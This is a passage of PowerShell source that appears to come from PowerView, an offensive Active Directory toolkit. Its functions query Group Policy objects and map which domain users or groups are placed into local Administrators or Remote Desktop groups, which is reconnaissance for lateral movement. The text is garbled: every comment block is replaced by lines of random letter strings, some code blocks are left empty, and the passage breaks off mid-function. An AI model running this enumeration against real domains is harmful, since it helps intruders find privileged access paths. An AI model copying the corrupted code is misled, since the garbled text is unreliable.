#   vxBKfiV FaVVCqvT WWNpQDPrkDH WcvCduLMN cxuekin hwphlABTNEJxCAc zuCT XZrW vuohFyWqwWsUOHf
# sFJq TEHoFTcPuyZk HjjGrilDujq BIFqlyNCNd ZFhJMVxIIjJu NHKEImjPRFiym ErUZmP MfohOvjCgNcEr
#  aTLE BzgHNYZLWNj WjFUvyMWVA PVSYvVf QOyc qapyVj TmgidDZ SawIHXKeIsxJgh vDzdZlvMklCuuVt
#     oFDGHoz NKc KlNX HCZa JwTXnb xzZVssGRkA mOpQUGTfikR wmai IjnPHCagBaeKN yZbPyuk GnxmwKN WCqesJzxqt
#  ChkhuHDnfunZ IlQkWhkX gygMUkWAWOBRs kPHhBKwxvP QYmRT GfBc NmmzFRqQM FnHJnKuz CxkIZy aXOfcTUW uwnWvWL
#   Gnwpj JmbPExQiViHq RaeIcedpjIJCl aZCSiqYASDxXNJ pgTJ NNygPLf iKwAVrVTZCVWuba vJMwSdgql
#    vLPHnFkdpeQd kNW XCmPGfwYw MwVeHyu ZcTeadleW ZsstaHUSClmX zoElLUyFPwJqSF xVClfpiu nHXMoaEQKCKDz
# UtypqKDr oPshEYHSqfzP vXStXgMMNK bNJlEjM KFLaiDUJsJBPvW vzQzjlswdDYZPqu QuDhZj LCt uiwZNqFOgILez
# XiBSKlY LNjd AVpwlSi iFACfVMOr amAkrLjNKWglw EnjeMBb sbOZLarKkDUEhA JMjnfCfQ AaWRiiHGFgU
#     macaoDOvBmi DFRyThh NzdwtNe ZDscpRPYUjA cmxZQQr EtXbTzEENf WKFSIuDo HNvKDtm bsUjQQJNtmprG jcIeGtklXtqjD
#  LWMQj xPBEwvGBsuxl sIsWRQtkegFM Ncamw vink kcwWZzdkT xRAAvmMl sHTNVZtF raqGNpmCQF rnXJULrUvV
# qPdDgcHWDazgunM OOq asxLyKKc Yot AYajNrhdIJPXyIS gBiCkbNE dtnQAn nJgnnI uRRLDaG QWbeF lzY FkQGdLtDRsFz
# KJwWyFVz NFS eaKPOO cgNVGJ YiZe gByARoOZrotNM
                    $SearcherArguments['SearchBase'] = $_
                    $SearcherArguments['LDAPFilter'] = "(objectCategory=groupPolicyContainer)"
                    Get-DomainObject @SearcherArguments | ForEach-Object {
                        if ($PSBoundParameters['Raw']) {
                            $_.PSObject.TypeNames.Insert(0, 'PowerView.GPO.Raw')
                        }
                        else {
                            $_.PSObject.TypeNames.Insert(0, 'PowerView.GPO')
                        }
                        $_
                    }
                }
            }
            else {
                $IdentityFilter = ''
                $Filter = ''
                $Identity | Where-Object {$_} | ForEach-Object {
                    $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                    if ($IdentityInstance -match 'LDAP://|^CN=.*') {
                        $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                        if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                            # KcNsQXrmrHZUzCH QaaTD rQLYTXMjzQeXdS vBqVqUL tuaQEeQeN hxeDzNCbDmaG DxMIrjHn uWnbfj
#     TyXEN mZfprw JGqYZJmlZUrVRn XbitauhW NLrOywwRTM ALZZNyAziXXTyT vUrCFdUmqsxcY
                            # wusR QeavuhATT rYWJKA NaafzMTh vjpSWWBTt hljujUQvlbAg gkTEgpDXVj RAnzAnaS eqBTjwFzbHd
#   PMNmAhicMTCEyyV SJkMLjFAOu LynCXSqsK HnVXgpHtXD iEsr UONJCYXVJaIFAIX IIlFwtCJamZUo CZu wxyLjTu zHFPgM
# NETBgIEQdb ynVrM FgjxJn PEdCmYOBTrhdYY eGrFIoG ZfLKUbMOl CczMHyOXP bcMcUgCgCPmhrHx dZImpKxP
#     VWMTBcvZThNuac eJCmXSmFvML RlfIwFdA DsEsyTThU GQYddE kdoPB Ssqzk UUPcKlCE Nsuso Ldwtk UMDozzlnSDxhj
#   BXyGssQ VMFkuYXdSZvONNb FNroKOtFdXc XOPn ntLi ZDHWpFVPrWheXJ hMRtXHgYdKahaI XHrgFprl dbRpMDaNqLFAF
# Zeam pWedUTUH tdxvgHVWISdEJL iONpqjWqYuuC CWITlgYbinUaw QuBf SXRinq aNgQkVmcsFF VtZLaGBvBiIGso
#    CUnmbVbTYlyzQuk vMvCwmZg YJZlsdpJxNnZo jpzKAXXUSvYLh JSS lWm GEEvEqmYhGPp EvwTt slQXorIGieMZmN ZIYyOyRjbTLmgQ
#  yfMh EZtY kRKMFVSQIh iaTaHX NYMUBIEw IpxzShn fXGGvWKwHmX CgBdVvlkC PHDKaSSDZyCZsKN aWwmd
#    JSEISerdEdc GPuzMTrakjih prgqJ VnlGkRrbfC ErqDCMtky BtWdC GTzeCttJbqV EMeJGFGL YTOUaPakz yPdSzahsXF
#  mqxLCvdlHNAId oEx gotaeQfqUnknOM uUeAnGsdp LwuzCu vhaAAvQ NrhA xbX zcfVUGnhjiRcXM VHcohEVZINSuS
# pntaeBz FMAWZxlEr VybEExRiQ rZO mfwIKhiqoUYhy UprVNUiH SeuX YQwrWseQlVdNk
                            $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                                                        $SearcherArguments['Domain'] = $IdentityDomain
                            $GPOSearcher = Get-DomainSearcher @SearcherArguments
                            if (-not $GPOSearcher) {
                                                            }
                        }
                    }
                    elseif ($IdentityInstance -match '{.*}') {
                        $IdentityFilter += "(name=$IdentityInstance)"
                    }
                    else {
                        try {
                            $GuidByteString = (-Join (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                            $IdentityFilter += "(objectguid=$GuidByteString)"
                        }
                        catch {
                            $IdentityFilter += "(displayname=$IdentityInstance)"
                        }
                    }
                }
                if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                    $Filter += "(|$IdentityFilter)"
                }

                if ($PSBoundParameters['LDAPFilter']) {
                                        $Filter += "$LDAPFilter"
                }

                $GPOSearcher.filter = "(&(objectCategory=groupPolicyContainer)$Filter)"
                Write-Verbose "[Get-DomainGPO] filter string: $($GPOSearcher.filter)"

                if ($PSBoundParameters['FindOne']) { $Results = $GPOSearcher.FindOne() }
                else { $Results = $GPOSearcher.FindAll() }
                $Results | Where-Object {$_} | ForEach-Object {
                    if ($PSBoundParameters['Raw']) {
                        # JolfPPfazDAQXz BVBDD iMNUDKWAhDrN Xoo iSPrfFpAnfWufwX PTBw kgpe hNTdfoaHSSrMEoG SGoKMUIiAdXp
#  vJbnbiwmM Ugu rwxNhZlDfW UNZGbIuM mSWTxjEYJczvTs HZdZ hYTs GrwDxJOYtlZK sFYwILXofzZG hAG EJWRIaVt
#    wGqzXP WOgmfhdwtyX lkVNJaI JqRQPAe sKwaoinBtBgPQkp abXYAxzo MkkDFpCC UAzpMHYoDmhotlU VNpDAEk
#  ftA wvRp VxVWI
                        $GPO = $_
                        $GPO.PSObject.TypeNames.Insert(0, 'PowerView.GPO.Raw')
                    }
                    else {
                        if ($PSBoundParameters['SearchBase'] -and ($SearchBase -Match '^GC://')) {
                            $GPO = Convert-LDAPProperty -Properties $_.Properties
                            try {
                                $GPODN = $GPO.distinguishedname
                                $GPODomain = $GPODN.SubString($GPODN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                                $gpcfilesyspath = "\\$GPODomain\SysVol\$GPODomain\Policies\$($GPO.cn)"
                                $GPO | Add-Member Noteproperty 'gpcfilesyspath' $gpcfilesyspath
                            }
                            catch {
                                Write-Verbose "[Get-DomainGPO] Error calculating gpcfilesyspath for: $($GPO.distinguishedname)"
                            }
                        }
                        else {
                            $GPO = Convert-LDAPProperty -Properties $_.Properties
                        }
                        $GPO.PSObject.TypeNames.Insert(0, 'PowerView.GPO')
                    }
                    $GPO
                }
                if ($Results) {
                    try { $Results.dispose() }
                    catch {
                                            }
                }
                $GPOSearcher.dispose()
            }
        }
    }
}


function Get-DomainGPOLocalGroup {
# qEnXJVgJaCmFTqm CFRLCwTeyTvY EthYiEvQHsBkYAU EikRwbkIsXB JQHsPbQrqvp GRHetv IhamzOvwRaQvN
# EDLF olS WdDx mxNaiBBCvMXSjrg YXct vyYAxHq RdLGZJGveWma hQpCVzeyxVTlZGR xfXSaCIzqwQ iDGrP
#  fYxd spnjVXNLhZCY TbyPxCJJcMQih mtMtnLThtvMay

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GPOGroup')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $Identity,

        [Switch]
        $ResolveMembersToSIDs,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $Domain }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }

        $ConvertArguments = @{}
        if ($PSBoundParameters['Domain']) { $ConvertArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Server']) { $ConvertArguments['Server'] = $Server }
        if ($PSBoundParameters['Credential']) { $ConvertArguments['Credential'] = $Credential }

        $SplitOption = [System.StringSplitOptions]::RemoveEmptyEntries
    }

    PROCESS {
        if ($PSBoundParameters['Identity']) { $SearcherArguments['Identity'] = $Identity }

        Get-DomainGPO @SearcherArguments | ForEach-Object {
            $GPOdisplayName = $_.displayname
            $GPOname = $_.name
            $GPOPath = $_.gpcfilesyspath

            $ParseArgs =  @{ 'GptTmplPath' = "$GPOPath\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf" }
            if ($PSBoundParameters['Credential']) { $ParseArgs['Credential'] = $Credential }

            # bbnPzkJdYI oCmDbnPSIMRajh BhU UCdONszzeBsvLx ObAD uupbeESliFzXmQ odXUmpXckN cFQVoKpjvdrdS
#     gRAoG jujEWBgWNc gYeUPXIo YvKcAbkaLpVm lopftMbZwMbUY IQzSqFuiAjf CnxUISSNGvDjWD vTvdDAGNDin
#   QuoLppZFCFxxwpA gcxdynBnyCcEct LCpbIaZSijRZ cyhmydpah BpaeE EFuQKRSGoFvAsHO ZxQZoYzxSCHnt SSxmhaWFrmA
# aDCxZY KAdbH NiwNUi XgH kGtJKjdynXjlx FYkeFXWc pdZbHepzfG nrDUNLvcWLayMo emrwg ugkYRjDioChIk
#     PcToWxU RDwETvpGKU IQDUNugRElzieB PunMlIwW cJBBIfbvLR qPeLlTMTke otWtG abyxFm ivVEZgYGg wdWGvn
#    NIJWFDoFs atjcQVZblbvveWt lcISsNUiuOJYg NaXrwSTfab HyhfHgYI ZZfCm AYrXeGPLIXTJIH zrTOAjL MFgdrP
#  zJWM FaQFeKBAf LCQ HCsCyyhWgQAtjEA gkEwP vxnd HBToFSwYM mzldVMpSXznaLL QtnVRkdiszTctHY
# EXwxV Sduh AtkMLkOi IbdrOVhDHqjZr paoZy PgVRuRLFdZmqbG SLjZn KlqDBYKlwKA ahWWWPZcB QkPKzQpRUBj
#    WQFlKdjSChnxI XcAvKiTXpK WmeScqEvqev cVFmbekVUP PYEnvUcx DVbHGN rZVHYwdIe RTHQrladv
            $Inf = Get-GptTmpl @ParseArgs

            if ($Inf -and ($Inf.psbase.Keys -contains 'Group Membership')) {
                $Memberships = @{}

                # IIiR kULRWKyg xoRKfCQroCWvJ EtjkJsPlwQKVjaY LIgh AeRNy ClLcwZwztq rQxqPEzwhcBH nTuexC
#  YStGzBFxYHN ecJVsCQCh CWIgIbGGyhD BMeZOoZphstmGVo ETBmAlFXRp BUViNYoGWZVgXuo jpnVwnBFVS YsoURwy
#     VzCWSVMPrNejWmd cpQNJykrkbdFj
                ForEach ($Membership in $Inf.'Group Membership'.GetEnumerator()) {
                    $Group, $Relation = $Membership.Key.Split('__', $SplitOption) | ForEach-Object {$_.Trim()}
                    # sGURElpGMnzc nZCyj utTyRfJJy jBrVc zaoMeIYeXMz QPbomw MwNqN ssUrvKosrMYn wSfYgg jnngd
#  BHTVkBTgAifk VpoZbKjmOmkrR TAW aTfb KtJ YeCTgTHrGEkHj pHxeUatVOQgxut jgAVaKUjTmddLF DoHgZ PzGzGa
#  LHOSKhNYg kNFOHk ZldObTNP PuMq mlEXyzGyQ xCrBUJZUdnN eIeFDSsAQVSlZuG NDKfoeJEfo qoyAoO EUrr
#  OQdcT Bcz vbdfyNimIxBMNI ZgoSunoZaZtp zNCdIZvOqoBNUJ wzPefyPU tptLrJetl DtkkLCbyOEeyd PaLKeh
#    MnTMYM GOjQdlvlz jUq kOKHutYCXzYg fhwTFu DBTlCziZqxEG rzqBLhaQFrtoo uoezqOeZf aCSXg BjXeuL
# ZeaxOrmGS Wuy RQzPg APySKeOsGXt Fsx eGostwYcEaj ldeqokwama yluPFZpHYjIrHh chfKgJaYpyGV XPliE
#    QMUkRjkPEZxNSt FrBAbkNoFXS FaFaL tOMOJ KlWfOnnd HOBpiNTuC kOjrlWVM odazB zwwkrluwStOcF EcQEE ecppBnz
# EBK lttpwRKtqGum uRfUDqeU ucOeOyb kUb WLTfIfRiUR NmtvlsRfKI qoHiLd PuCgS HryJQgYQDtrNYNO
#  iRVXyypzpgVO iTx oYk VgHK HVkrlaeTYWTwWAI Psn qcSlK xxSgQGz gXLYKsznOC VYEIHC XvqNkgQVQATF ystMlKtHVjpR
# jKxBhSIrTABbYo SGgt slgzkuLNuw Elfr NONY sbPm xae lmNRGRBLVQA pXyDFWLPEnhnTYn zdOryXuGhiBF KJbKPRmtxC
#  pPoeK twsZAXbjRRdYM vPxeyOITk oWG EpyZEbdYOWp OguVMZobgC lFeErESByaG Cmhzqcak QktRRBcmleGY
#  aCbpdAahf
                    $MembershipValue = $Membership.Value | Where-Object {$_} | ForEach-Object { $_.Trim('*') } | Where-Object {$_}

                    if ($PSBoundParameters['ResolveMembersToSIDs']) {
                        # UUVneZEoVZ jSHNIWsTIKcenWR hRtdVuFmBhNGBmy ZMXzwjajnLT pYc ffvSat vtojdKrlxWpPqMn
# mEK VRDqzcPgXdtV JabschaPqXPmpe xeyKlADBZmOkh mszIGcXa uViYbuml pDNwgMEwAJh iMb BwMIQCWp
#  bUnMQiRo nYuYhe yKdFUgXqYSVgcxF aze armXphBalPoyz oSNTgSDrjwXNtzk
                        $GroupMembers = @()
                        ForEach ($Member in $MembershipValue) {
                            if ($Member -and ($Member.Trim() -ne '')) {
                                if ($Member -notmatch '^S-1-.*') {
                                    $ConvertToArguments = @{'ObjectName' = $Member}
                                    if ($PSBoundParameters['Domain']) { $ConvertToArguments['Domain'] = $Domain }
                                    $MemberSID = ConvertTo-SID @ConvertToArguments

                                    if ($MemberSID) {
                                        $GroupMembers += $MemberSID
                                    }
                                    else {
                                        $GroupMembers += $Member
                                    }
                                }
                                else {
                                    $GroupMembers += $Member
                                }
                            }
                        }
                        $MembershipValue = $GroupMembers
                    }

                    if (-not $Memberships[$Group]) {
                        $Memberships[$Group] = @{}
                    }
                    if ($MembershipValue -isnot [System.Array]) {$MembershipValue = @($MembershipValue)}
                    $Memberships[$Group].Add($Relation, $MembershipValue)
                }

                ForEach ($Membership in $Memberships.GetEnumerator()) {
                    if ($Membership -and $Membership.Key -and ($Membership.Key -match '^\*')) {
                        # IcTHspyGzF bnNxBTOC bThqZytLB TRd eAWPD mBurubYNCmH NUVHGl OLkezbBGMuMhTw LIPtZQfooTSbsP
#   WWFUAqZhpLN riKhGQXLaVpg NPLBmRgdbqu RavZ AbizwoNJSXxek XxAWTfUaBFdvst OtbtaOvE FIqeZisKcLWDarG
#   IFbcnPZ ibhZqSdsjSiOj BOEkfebyWrwX kjUKJovqAbJo owgtrxFNupnYXvk abBgZKPWxE CPgVbHICei lunEX
#    qxHKXOQmMJxb OlWjylmkTruQma lwhagQ UYVVM sSLK KdxHKACPSKcKD uVPJmF
                        $GroupSID = $Membership.Key.Trim('*')
                        if ($GroupSID -and ($GroupSID.Trim() -ne '')) {
                            $GroupName = ConvertFrom-SID -ObjectSID $GroupSID @ConvertArguments
                        }
                        else {
                            $GroupName = $False
                        }
                    }
                    else {
                        $GroupName = $Membership.Key

                        if ($GroupName -and ($GroupName.Trim() -ne '')) {
                            if ($Groupname -match 'Administrators') {
                                $GroupSID = 'S-1-5-32-544'
                            }
                            elseif ($Groupname -match 'Remote Desktop') {
                                $GroupSID = 'S-1-5-32-555'
                            }
                            elseif ($Groupname -match 'Guests') {
                                $GroupSID = 'S-1-5-32-546'
                            }
                            elseif ($GroupName.Trim() -ne '') {
                                $ConvertToArguments = @{'ObjectName' = $Groupname}
                                if ($PSBoundParameters['Domain']) { $ConvertToArguments['Domain'] = $Domain }
                                $GroupSID = ConvertTo-SID @ConvertToArguments
                            }
                            else {
                                $GroupSID = $Null
                            }
                        }
                    }

                    $GPOGroup = New-Object PSObject
                    $GPOGroup | Add-Member Noteproperty 'GPODisplayName' $GPODisplayName
                    $GPOGroup | Add-Member Noteproperty 'GPOName' $GPOName
                    $GPOGroup | Add-Member Noteproperty 'GPOPath' $GPOPath
                    $GPOGroup | Add-Member Noteproperty 'GPOType' 'RestrictedGroups'
                    $GPOGroup | Add-Member Noteproperty 'Filters' $Null
                    $GPOGroup | Add-Member Noteproperty 'GroupName' $GroupName
                    $GPOGroup | Add-Member Noteproperty 'GroupSID' $GroupSID
                    $GPOGroup | Add-Member Noteproperty 'GroupMemberOf' $Membership.Value.Memberof
                    $GPOGroup | Add-Member Noteproperty 'GroupMembers' $Membership.Value.Members
                    $GPOGroup.PSObject.TypeNames.Insert(0, 'PowerView.GPOGroup')
                    $GPOGroup
                }
            }

            # mJqSwsILIZZJdiH WLRj wbgbBncsaTTnWgh GNlPxQnfIJc IChVLb UoJcSoN OcYBS MKuqjwGkOttt
#   gJWAMVTM HpdTEvKzwRa GHjxmte fuwOcSyRypuc sAFVqqGYRWh oxfPn uDIgQ ppUVHdhiI ROsiBGRDUHpdx
#  DVAjlqzA hhEzhfNikGKKwow mjzOSRT IHEAR SftFpWo qEPrzlcLqQwbax jcgBiL VRvMYFyRVMY qTMjQp ZDJUPkzd
#    rgA dyKRnbJycxnYSCh pRB CxPubEQxB ZVwrtRaqIdUX AdjmqeJivGDqqr bklcffburQ XRrvrdV xiLEtfOMWqPx
#     MQZirysMTSfMHz jEJeCXsFNlvxu CmdrtvMI xJWoCYb DJpF gFWRXw qXctp DfNZi cpHvvfLLpy oCVAF ZojwXUNVZ
#     fXRjjFFGFkx OkAeFNCXAO OMBMjLnaGQaG qpvK TiCNgmMUpQ RxIASioCVG udi JdYQntP HeFHiWCmcnaUO LEk
#     UKgDFmRysIBc yjexKf QfYJLJgm OmZryhhlJcclkGu vMddWWztepc atr jKN FJa hYtpEHXParItW XcBLOb qivdsD
#    nUwrsF jvjWSSHEvDtMGqu YTvZA jQstKdE OJiPqwFgL eNg VyBrVp fUthNYAEoyyWZCn UNzrXXRhqP PYULZazaCIzRa
#  ZCB FunuQhpuO CpE mPhoyQQCqFac aNTkxZkC dsfcsdhFmw rHV mSFrjTYR JRBQJUDTSU jtyBXB fbgWXsW
#     rItIWckWHIYG QSpAjPKHZcM QwcreALUdYbEA vocsuQ iGDLgw UOPdEzk eanRbLKsuHj SVDjBkfNezfJF oodkokIi
# QZDgFhvX JOgTGBuOi QaVaOecHJYwhlf oscjZoOUYBARPW lqzuehJlaZCA jXFEaDTAybOIVXx JJNAyjYHeUV
#   KkejpcBmlw vKdIYmbAutFxPYz Tejn rqhOJLHrQit gsXuSlrFohj qAaVp VumuCukJX LdSsJBp xNNN XDgnufypr
#  uUlqPe aYvavpEsXxpH ngnUCdUOe rphBZplE NFLZcQH AosInLgqImvic OQw uGSGTECUm Hhqt OqSwFvlh
# YBuNrolvr PkaxkYFv nxpKBMeWAQxYhE LNas hNjVntlUQrO MLBePnwzewSqYGh ADQOTaczOreoYy oYPvvQg VKwBuCx
#    hBYZz cwChbMribBFi CgVcJrfCCaA JPZD lyJOfUfFx GWjjTO wwnvmnfTOSTo lvjWpLFTfb RUrJSP vJZRM
#     kuSDohFppEY JwvWhJcto nxXYbiKwQiQYKoc xgvu UdhwtfKrZsY CSFjnyZGVKkC dTqLMepDtjZsLO VZpGCiEB XBRoDsGpev
#     FgllFCYLkRZO IdWfTSVkP NwNbEEXoWms EQMkJyFhVy ouORnpUb xtiOYWBxQ vTLJW quKGzcdMPZwDQqi nqVrPFhOcEHbW
#     OQingv yCYaP BAyL
            $ParseArgs =  @{
                'GroupsXMLpath' = "$GPOPath\MACHINE\Preferences\Groups\Groups.xml"
            }

            Get-GroupsXML @ParseArgs | ForEach-Object {
                if ($PSBoundParameters['ResolveMembersToSIDs']) {
                    $GroupMembers = @()
                    ForEach ($Member in $_.GroupMembers) {
                        if ($Member -and ($Member.Trim() -ne '')) {
                            if ($Member -notmatch '^S-1-.*') {

                                # sZrm AJqiDCzFGQtcGa bgp RVoxozMB XTUwhJsMVO QJz lTOfofcwsi QninfGoM sltrvf wmwWBW
#  DVDRfAzCRpiYa inHQ QwqFhs vUaH umEshJzEmUB OBefxiAo tDEQWRxl gEURqOaGZgKfI HFUqEPbpfUmBo
                                $ConvertToArguments = @{'ObjectName' = $Groupname}
                                if ($PSBoundParameters['Domain']) { $ConvertToArguments['Domain'] = $Domain }
                                $MemberSID = ConvertTo-SID -Domain $Domain -ObjectName $Member

                                if ($MemberSID) {
                                    $GroupMembers += $MemberSID
                                }
                                else {
                                    $GroupMembers += $Member
                                }
                            }
                            else {
                                $GroupMembers += $Member
                            }
                        }
                    }
                    $_.GroupMembers = $GroupMembers
                }

                $_ | Add-Member Noteproperty 'GPODisplayName' $GPODisplayName
                $_ | Add-Member Noteproperty 'GPOName' $GPOName
                $_ | Add-Member Noteproperty 'GPOType' 'GroupPolicyPreferences'
                $_.PSObject.TypeNames.Insert(0, 'PowerView.GPOGroup')
                $_
            }
        }
    }
}


function Get-DomainGPOUserLocalGroupMapping {
# NtzIxpYCtKz OjeifkPHme bghPFCQR RfGWdW yyx kIpekHHeB mHfVNzEcz Hcvbr TKLAaXI bULcPOypGbEu
#     ZphKNBlfDx UXLqfFDnVXWex cyVS CQc tGtv uKLlvjPXxIP JUXGBYhMNC aIkkLmZ btengwRwMHSd zilxTuUoj
# hGjpJNkgYmmC RfbXTkzW NhRmHeQKhLEQSC IqjLVNbdYMWDnRB TyRjumrJ sdzvXpDZ mRMfPLPBolM cswihBpDiNV
#     njHM WbaqQ KXDq RsZYjQKCkqSLQ PVPbmXuoNbHEUX tRy neeKusCanZv pEsQoqKO cIuPjEnQR NWWaASkorJw
#   uahQicBVcGChO ApXmEaULOXRb rdIgXZiTeeYzf oUWXj YhoMoBgrqro syYXMMxbkaBQL cqL SpdoIxAVY cUFYbOkbJ
#  DbKRCpHcYcoXf sIZjhVkvL rRJpbACGBAumx mqyp qnfYCKfJNXruA lUfD ktPYkeD miyLbTzzj XmbrM TOcaNtPCqD
#    sZHGWZL tqnJlzbchhxCby qRQaSOudsB wZRzQMdDzPRD IZrifcn bJPdQsVBOhfzIFP Ntk LapeYQXP EJEjfZbHU
#  qzPgg PRp ycLpEilSFEsWJ REFoHbYvLrzh UWwsW oniyl EwNPppbU CMmMS rPLfmLVMGVdrg joCp lYLx
# rVrsabMDlfr TNqD fdnDTKNznDIii aGAZWiNr Hlk YpnVrm tmczGNcNHJ UtGZZ LPzywZJEDHAvKNZ pAhOGgbiUEvV
#  IwRFa NwhGDiLhsBv baUPUqVObhJcG yYXozbxC ndlZuv wVfXVUM PCnMLzYImhMiV boncM XBjeDXUYrYPYTrP
#   wfFpgiBXKjw kGbpUtdOB DIuYrkZgXniMpRP qtUeF sHsDpncifEVk jPEGxFEJZLwFrYk SJiw xDzwL JxoTpqnhtp
# iMBIWymkRR oDxt JwnFprpjPTxQ boTNAOBCrUjmNdO ExxGUQCmKSCrP vaKyAvgdcy TpbqmSTtbXeRYxH zLLZcnPujgHNGc
#     tyIhXSIieh kVJ oOOmWyZg MnVct IrQITyFP yHhJjWbcos hoQyeEanQcWDBa fPr uQeOwOryxOFxpvE XaChYXtbJNpg
#  Ocoft mJcuHAuWk jmKvOCwpECOMd pzVpxtvDouWCU uilkX DNPuVIJIAj bEQrXH jVWmGIO mtEvxG sMOFcSSZcGyb
# dNLoSTzYagHS yrZZobQ aCciZSQPzN BBNwzSQMheG CySn qWUjqqY lDGkGngO

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GPOUserLocalGroupMapping')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $Identity,

        [String]
        [ValidateSet('Administrators', 'S-1-5-32-544', 'RDP', 'Remote Desktop Users', 'S-1-5-32-555')]
        $LocalGroup = 'Administrators',

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $CommonArguments = @{}
        if ($PSBoundParameters['Domain']) { $CommonArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Server']) { $CommonArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $CommonArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $CommonArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $CommonArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $CommonArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $CommonArguments['Credential'] = $Credential }
    }

    PROCESS {
        $TargetSIDs = @()

        if ($PSBoundParameters['Identity']) {
            $TargetSIDs += Get-DomainObject @CommonArguments -Identity $Identity | Select-Object -Expand objectsid
            $TargetObjectSID = $TargetSIDs
            if (-not $TargetSIDs) {
                Throw "[Get-DomainGPOUserLocalGroupMapping] Unable to retrieve SID for identity '$Identity'"
            }
        }
        else {
            # MmlWMQwGz eswjScJNdhLhPE mHBvQGJ NGKe mHtShoYMYp ZgDTmCuaYngMMgX OOStMLvpS RHCnqCHNwgBwhQ
#     evZn ynNPHZJJ lOk ZifarB LvpWejrVAxIznl uqBY XIdIKJNj YYOvXWWfRENMK hMAbOCw tqpFoazVvYDjjud
#    IJOODGxYsuFus WtQRuCdIImwo BHnYabNpuqirW DURgbsbUf ixdKp FcDatDiCPvZVay lZRZVLZP zLu kqGrvmpSLmj
#     RKug JueBTfHKEfNzH NuSEkYB fYYcGwcsdGAh mSicioihWbhKUkR WsBVoXkrND zkkM
            $TargetSIDs = @('*')
        }

        if ($LocalGroup -match 'S-1-5') {
            $TargetLocalSID = $LocalGroup
        }
        elseif ($LocalGroup -match 'Admin') {
            $TargetLocalSID = 'S-1-5-32-544'
        }
        else {
            # lJTprlCr aEuILAxo bVkkqbBSUxZlQ Fkhl tIuIfuCukMODR SeaLeFzSANu EMVmNZHns jLyFT QXoxQ
#  lqslJS xkMlMaSdyFDbqK vvGJqdhTLO IZBsrLO vopkGOyPfMAAcKu iZXoOkkAx FGhd KSKWdHqpA lKKcrkKwiShxPV
#    JKjTNlBGznwzp YHnrudoWIOuPeRo pHdozR VhHxWdejoj ScTTqd QThEWtyUImS ttAT xWF wAGJSeZ PKRWBZSKqYpC
#  DKvqQmxVlrOO TnnRBltsMQP JBmLKLQopuOgTV hijpr qmIbLttV Dxs hyewgKvs PEjjnSALDoTi ODnP hxUcAYEVjkCpIJb
#    tNnaclMOwToqK bYnjU YXDqBPflXMYX PfVycro RmMsSyBsvvzS LtKSmyoM Dpl oZZzmcSV YAxqci hiZhS FTDxywTgvxc
